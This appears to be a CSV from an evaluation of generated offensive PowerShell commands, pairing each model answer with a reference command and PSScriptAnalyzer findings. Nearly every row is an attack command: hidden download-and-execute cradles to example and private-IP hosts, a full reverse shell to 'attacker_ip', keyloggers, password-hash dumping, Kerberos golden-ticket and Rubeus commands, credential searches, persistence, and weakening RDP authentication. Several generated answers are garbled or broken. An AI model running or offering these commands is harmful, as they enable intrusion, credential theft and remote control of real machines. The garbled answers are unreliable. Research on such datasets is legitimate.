Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code'),[''],[''],[''],[''],[''],['']
Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32,Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path},[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName <file_path> -ScriptBlock {<xml_payload>},"${mwcpath}\${mwcname} ""${xml_payload}"" output.txt",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],['UnexpectedToken '],"[""Unexpected token '\\${mwcname}' in expression or statement. ""]",['ParseError']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest http://www.somewhere.com/hello.ps1 -OutFile hello.ps1; .\hello.ps1""","powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content""",[''],[''],[''],[''],[''],['']
Get-NetHost -ComputerName < remote_host> -Domain < domain_name>,net view \\${remote.host.fqdn} /all,"['RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError']",[''],[''],['']
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name Winlogon -Value ""<script>""","Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, ${binaryToExec}"" -Force",[''],[''],[''],['PSAvoidUsingPositionalParameters '],"[""Cmdlet 'Set-ItemProperty' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]",['Information']
Invoke-Command -ComputerName $target -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')},Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') },"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']","['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' Warning']"
"dir ${input_file} -Recurse | select-string ""\:(.+)$"" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{file_name=$_.Matches.Groups[1].Value.Trim(); $_} | select-string ""File Content\${input_file}"" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{file_name=$_.Matches.Groups[1].Value.Trim(); $_} | select-string ""Class Content\${input_file}"" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{file_name=$_.Matches.Groups[1].Value.Trim()} | select-string ""Method Content\${input_file}"" | %{$name=$_.Matches.Groups[1].Value.Trim()} | select-string ""Instance Content\${input_file}"" | %{$name=$_.Matches.Groups[1].Value.Trim()} | select-string ""Property Content\${input_file}"" | sort -Descending -property count",dir,"['ExpectedExpression ', ' ExpectedExpression ', ' ExpectedExpression ', ' PSUseDeclaredVarsMoreThanAssignments ', ' PSUseDeclaredVarsMoreThanAssignments ', ' PSUseDeclaredVarsMoreThanAssignments ', ' PSUseDeclaredVarsMoreThanAssignments ', ' PSUseDeclaredVarsMoreThanAssignments ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""An expression was expected after '('. "", "" An expression was expected after '('. "", "" An expression was expected after '('. "", "" The variable 'name' is assigned but never used. "", "" The variable 'name' is assigned but never used. "", "" The variable 'name' is assigned but never used. "", "" The variable 'name' is assigned but never used. "", "" The variable 'name' is assigned but never used. "", "" 'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sort' is an alias of 'Sort-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning']",['PSAvoidUsingCmdletAliases '],"[""'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"Import-Module ${cert_path} ; Move-Item ${cert_path} -Destination ${root_store} ; $cert = ""${cert_path}""","$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\LocalMachine\My ; Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'cert' is assigned but never used. ""]",['Warning'],[''],[''],['']
Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSI_p}' },Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' },[''],[''],[''],[''],[''],['']
Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -Command IEX (New-Object net.webclient).DownloadString('http://www.getyourpowershellhere.com/payload'),Invoke-ExecuteMSBuild,['PSAvoidUsingComputerNameHardcoded '],"[""The ComputerName parameter of cmdlet 'Invoke-ExecuteMSBuild' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]",['Error'],[''],[''],['']
(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe').Id,Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',[''],[''],[''],[''],[''],['']
Get-DomainComputer -Domain domain.external,Get-Domain,[''],[''],[''],[''],[''],['']
"krbtgt /hash:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /startoffset:0 /endin:600 /renewmax:10080 /ptt""",ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator,['TerminatorExpectedAtEndOfString '],"['The string is missing the terminator: "". ']",['ParseError'],"['RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError']"
"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows\CurrentVersion\WINEVT-Channels\Microsoft-Windows-Windows\CurrentVersion\WINEVT-Channels\Microsoft-Windows-Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\CurrentVersion\WINEVT-Channels\Windows\","$pattern = ""password"";$hives = ""HKEY_CLASSES_ROOT"",""HKEY_CURRENT_USER"",""HKEY_LOCAL_MACHINE"",""HKEY_USERS"",""HKEY_CURRENT_CONFIG"";foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | sls ""$pattern"" };foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match ""$pattern"") { $_.PsPath; $_ | out-string -stream | sls ""$pattern"" }}}",['TerminatorExpectedAtEndOfString '],"['The string is missing the terminator: "". ']",['ParseError'],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning']"
Get-PSSession -ComputerName dc.domain.local,Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\username,['PSAvoidUsingComputerNameHardcoded '],"[""The ComputerName parameter of cmdlet 'Get-PSSession' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]",['Error'],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd,$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Get-PassHashes -OutFile 'C:\temp\hashdump.txt',"iex(iwr(""https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1""));Get-PassHashes",[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iwr' is an alias of 'Invoke-WebRequest'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
$function = 'Get-Process'; Set-Name -Name $function -Value Get-ChildItem; Invoke-Expression $function,Function MyGetProc { Get-Process }; MyGetProc,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap,Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap,[''],[''],[''],[''],[''],['']
"Get-SQLServerLinkCrawl -Verbose -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ""powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')""'","Invoke-SQLEscalatePriv -Verbose -Instance ""SQLServer1\Instance1""",[''],[''],[''],[''],[''],['']
Get-GPO -Domain $ENV:userdnsdomain ${gpo_param} >> ${gpo_output},Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}',[''],[''],[''],[''],[''],['']
"$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()",$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path,"['MissingExpressionAfterToken ', ' UnexpectedToken ', ' MissingEndParenthesisInExpression ', ' UnexpectedToken ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingPositionalParameters ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""Missing expression after ','. "", "" Unexpected token 'attacker_port' in expression or statement. "", "" Missing closing ')' in expression. "", "" Unexpected token ')' in expression or statement. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" Cmdlet 'New-Object' has positional parameter. Please use named parameters instead of positional parameters when calling a command. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'pwd' is an alias of 'Get-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Warning ', ' Information ', ' Warning ', ' Warning ', ' Warning']",[''],[''],['']
netsh interface portproxy add v4tov4 listenport=${ListenPort} connectport=${ConnectPort} connectaddress=${ConnectAddress},netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23,[''],[''],[''],[''],[''],['']
"gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password'","gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern ""password""",['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"Get-DomainShare -Recurse | ? { $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' }",Find-DomainShare -CheckShareAccess,['PSAvoidUsingCmdletAliases '],"[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],[''],[''],['']
nslookup -querytype=reverse -host=10.10.1.0 -port=443 -recurse,"$net = ""10.10.1."";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(""\s+"","""").replace(""`r"","""").replace(""`n"","" ""); Write-Output ""$net$_ $r""} | tee ip_hostname.txt",[''],[''],[''],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'foreach' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'ft' is an alias of 'Format-Table'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'tee' is an alias of 'Tee-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
"raiseChild.py < child_domain>/username@10.10.10.10 | grep ""Domain Controller"" | grep ""Administrator"" | grep ""S-1-5-21-1473643419-774954089-2222329127 /user:10.10.10.10 | grep ""Domain"" | grep ""Administrator"" | grep ""S-1-5-21-1473643419-774954089-2222329127 /user:10.10.10.10 | grep ""DomainController"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" | grep ""Domain"" |",raiseChild.py -target-exec 10.10.10.10 <child_domain>/username,"['RedirectionNotSupported ', ' EmptyPipeElement ']","[""The '<' operator is reserved for future use. "", ' An empty pipe element is not allowed. ']","['ParseError ', ' ParseError']",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"New-SmbShare -Name ""sharedir"" -Force","new-item ""c:\users\public\share"" -itemtype directory;New-SmbShare -Name ""sharedir"" -Path ""C:\users\public\share"" -FullAccess ""Everyone"",""Guests"",""Anonymous Logon""",[''],[''],[''],[''],[''],['']
$data = Get-Process | ConvertTo-Json; Invoke-Expression $data,$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
"[System.Security.Principal.WindowsPrincipal]::GetCurrent() | ? { $_.IsGroup -match ""false"" } | % { Get-ObjectSid -Value ""admin"" }",([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value,"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",[''],[''],['']
$path = 'C:\windows;tds;tds.dit' ; Invoke-Expression $path,$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
$script = 'Get-Process'; Invoke-Expression $script;,$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","(Get-WmiObject -class ""Win32_TSGeneralSetting"" -Namespace root\cimv2\terminalservices -Filter ""TerminalName='RDP-tcp'"").SetUserAuthenticationRequired(0)",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
Get-ForestGlobalCatalog -Forest local,Get-ForestGlobalCatalog,[''],[''],[''],[''],[''],['']
"Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class KeyloggingAPI { [DllImport(""keystrokes.dll"", SetLastError = true)] public static extern IntPtr OpenSCManager(string lpMachineName, string lpSCDB, int scParameter); [DllImport(""keystrokes.dll"", SetLastError = true)] public static extern IntPtr CloseSCManager(); [DllImport(""keystrokes.dll"", SetLastError = true)] public static extern IntPtr GetKeystrokes(uint uFormat); [DllImport(""kernel32.dll"", SetLastError = true)] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport(""kernel32.dll"", SetLastError = true)] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport(""kernel32.dll"", SetLastError = true)] public static extern int GlobalSize(IntPtr hMem); } ""@ [KeyloggingAPI]::OpenSCManager(null, null, 0xF003F) # Further code to create, modify, or start keystrokes goes here","Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(""user32.dll"")] public static extern int GetAsyncKeyState(Int32 i); } ""@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }","['UnexpectedCharactersAfterHereStringHeader ', ' MissingArgument ']","['No characters are allowed after a here-string header but before the end of the line. ', ' Missing argument in parameter list. ']","['ParseError ', ' ParseError']","['UnexpectedCharactersAfterHereStringHeader ', ' MissingEndParenthesisInExpression ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' MissingEndParenthesisAfterStatement ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' PSAvoidUsingPositionalParameters ']","['No characters are allowed after a here-string header but before the end of the line. ', "" Missing closing ')' in expression. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'eq' in expression or statement. "", "" Missing closing ')' after expression in 'if' statement. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'Write-Host' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Cmdlet 'Add-Type' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Information']"
"$code = 'Invoke-Expression'; Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class CodeExecutionProvider { [DllImport(""kernel32.dll"")] public static extern bool InvokeCode(IntPtr hWndNewOwner); [DllImport(""kernel32.dll"")] public static extern bool InvokeCommand(IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead); [DllImport(""kernel32.dll"")] public static extern IntPtr GetBytesRead(IntPtr hMem); [DllImport(""kernel32.dll"")] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport(""kernel32.dll"")] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport(""kernel32.dll"")] public static extern int GlobalSize(IntPtr hMem); } ""@ $class = [CodeExecutionProvider]::InvokeCode($code, [IntPtr]0x00000000, $code.Length, [ref]$bytesRead)","Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine(""Executed""); } }'; [MyClass]::Run()","['UnexpectedCharactersAfterHereStringHeader ', ' PSAvoidUsingPositionalParameters ']","['No characters are allowed after a here-string header but before the end of the line. ', "" Cmdlet 'Add-Type' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' Information']",[''],[''],['']
"powershell.exe -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.9.122.8:8080/AZPLhG9txdFhS9n')""",powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');,[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","Get-NetFirewallRule -DisplayGroup ""Remote Desktop"" | Set-NetFirewallRule -Enabled True",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
"Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq ""Accessible"" } | Get-SQLColumnSampleDataThreaded -SQLInstanceDomain $ENV:USERDNSDOMAIN ${sql_instance_domain} -SQLColumnSampleDataThreaded ${sql_column_sample_data_threaded}","Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq ""Accessible"" } | Get-SQLServerInfo",['PSAvoidUsingCmdletAliases '],"[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
